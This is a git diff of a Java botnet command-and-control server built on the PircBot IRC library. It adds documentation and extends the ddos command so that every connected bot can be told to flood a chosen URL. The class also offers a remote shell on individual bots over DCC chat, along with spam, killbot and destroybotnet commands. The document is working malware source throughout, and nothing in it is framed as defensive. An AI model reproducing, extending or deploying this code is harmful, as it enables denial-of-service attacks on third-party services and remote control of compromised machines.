@@ -4,6 +4,36 @@ import java.util.*;
 
 import org.jibble.pircbot.*;
 
+/**
+ * This is the BotnetServer class, it serve as the command and control interface for the bot master.
+ * There are several commands available to the user including
+ * <dl>
+ * 		<dt>Help</dt>
+ * 			<dd> Prints out the available commands <br/>
+ * 				Usage: help
+ * 			</dd>
+ * 		<dt>Names</dt>
+ * 			<dd> Prints out the nicks of all bots running on the IRC server <br/>
+ * 				Usage: names
+ * 			</dd>
+ * 		<dt>Remote shell</dt>
+ * 			<dd> One must give the command "exit" to leave the shell again, if you must type "exit" but don't wish to leave simply append a space <br/>
+ * 				Usage: shell botNick [timeout]
+ * 			</dd>
+ * 		<dt>Distributed Denial of Service</dt>
+ * 			<dd> One can specify by nick and number of bots to have participate or simply say "all" for the first bot nick to have all bots participate  <br/>
+ * 				Usage: ddos url interval duration bot [more bots]
+ * 			</dd>
+ * 		<dt>Spam</dt>
+ * 			<dd>
+ * 			</dd>
+ * 		<dt>Lease</dt>
+ * 			<dd>
+ * 			</dd>
+ * </dl>
+ * 
+ * @author Roy McElmurry, Robert Johnson
+ */
 public class BotnetServer extends PircBot {
 	private static final String[] COMMANDS = {"help", "names", "list", "shell", "ddos", "spam", "lease", "killbot", "destroybotnet"};
 	
@@ -22,6 +52,9 @@ public class BotnetServer extends PircBot {
 		BotnetServer bn = new BotnetServer();
 	}
 	
+	/**
+	 * Constructs a new BotnetServer object that connects to the IRC channel and awaits commands from the user.
+	 */
 	public BotnetServer() {
 		input = new Scanner(System.in);
 		try {
@@ -59,6 +92,9 @@ public class BotnetServer extends PircBot {
 		System.out.println("<" + sender + ">: " + message);
 	}
 	
+	/**
+	 * Reads input from the user and handles the command.
+	 */
 	public void init() {
 		System.out.print("Command: ");
 		String message = input.nextLine();
@@ -69,18 +105,31 @@ public class BotnetServer extends PircBot {
 		}
 	}
 	
+	/** 
+	 * <p>If s is a recognized command, the corresponding action is taken, 
+	 * otherwise if s begins with a colon it is interpreted as a private message to the channel 
+	 * and finally if it is not a command or a private message to the channel then it is sent 
+	 * as a raw message the IRC server.</p>
+	 * 
+	 * @param s A command/message to be interpreted
+	 */
 	public void performCommand(String s) {
+		//Respond to a help command with a shit ton of printlns.
 		if (s.toLowerCase().equalsIgnoreCase("help")) {
 			printHelp();
+		//Respond to a list command by listing all channels (DOESN'T WORK)
 		} else if (s.toLowerCase().equalsIgnoreCase("list")) {
 			listChannels();
+		//Respond to a names command by getting the user on CHANNEL and printing their nicks
 		} else if (s.toLowerCase().equals("names")) {
 			User[] bots = getUsers(CHANNEL);
 			for (int i = 0; i < bots.length; i++) {
 				System.out.println("\t" + bots[i].toString());
 			}
+		//Respond to setop command by acquiring exclusive operator status (DOESN'T WORK)
 		} else if (s.toLowerCase().equalsIgnoreCase("setop")) {
 			acquireOpStatus();
+		//Respond to the shell command by sending commands to the specified bot and reading responses until the chat has ended
 		} else if (s.toLowerCase().startsWith("shell")) {
 			String[] parts = s.split(" ");
 			if (parts.length >= 3) {
@@ -90,24 +139,39 @@ public class BotnetServer extends PircBot {
 			} else {
 				System.out.println("\tUsage: shell botNick [timeout]");
 			}
+		//Respond to a ddos command by gathering the arguments and private messaging each specified bot
 		} else if (s.toLowerCase().startsWith("ddos")) {
 			String[] parts = s.split(" ");
 			if (parts.length < 5) {
 				System.out.println("\tUsage: DDOS url interval duration bot [more bots]");
 			} else {
+				String[] botNames;
+				if (parts[4].equalsIgnoreCase("all")) {
+					User[] bots = getUsers(CHANNEL);
+					botNames = new String[bots.length];
+					for (int i = 0; i < bots.length; i++) {
+						botNames[i] = bots[i].getNick();
+					}
+				} else {
+					botNames = Arrays.copyOfRange(parts, 4, parts.length);
+				}
 				String command = parts[0] + " " + parts[1] + " " + parts[2] + " " + parts[3];
-				String[] bots = Arrays.copyOfRange(parts, 4, parts.length);
-				for (int i = 0; i < bots.length; i++) {
-					this.sendMessage(bots[i], command);
+				for (int i = 0; i < botNames.length; i++) {
+					this.sendMessage(botNames[i], command);
 				}
 			}
+		//Respond to a message beginning with a colon by messaging the CHANNEL
 		} else if (s.startsWith(":")) {
 			sendMessage(CHANNEL, s.substring(1));
+		//Respond to all other messages by sending the message raw to the IRC server
 		} else if (!s.isEmpty()) {
 			sendRawLine(s);
 		}
 	}
 	
+	/**
+	 * Gives the CC bot operator status and then removes it from all other bots.
+	 */
 	private void acquireOpStatus() {
 		op(CHANNEL, NAME);
 		User[] bots = getUsers(CHANNEL);
@@ -120,6 +184,9 @@ public class BotnetServer extends PircBot {
 		op(CHANNEL, NAME);
 	}
 	
+	/**
+	 * Prints out a help message that describes available functionality and commands.
+	 */
 	private void printHelp() {
 		System.out.println("\tBotnet:");
 		System.out.println("\t\tList");
@@ -135,6 +202,10 @@ public class BotnetServer extends PircBot {
 		System.out.println("\t\t\t'duration' seconds from each of the given bots (pass 'all' to use all bots)");
 	}
 	
+	/**
+	 * Establishes a DCC chat with the specified bot for the purpose of creating a remote shell.
+	 * Feeds commands to the bot and prints out responses.
+	 */
 	private void engageInChat(String botNick, int timeout) {
 		DccChat chat = dccSendChatRequest(botNick, timeout);
 		if (chat == null) {
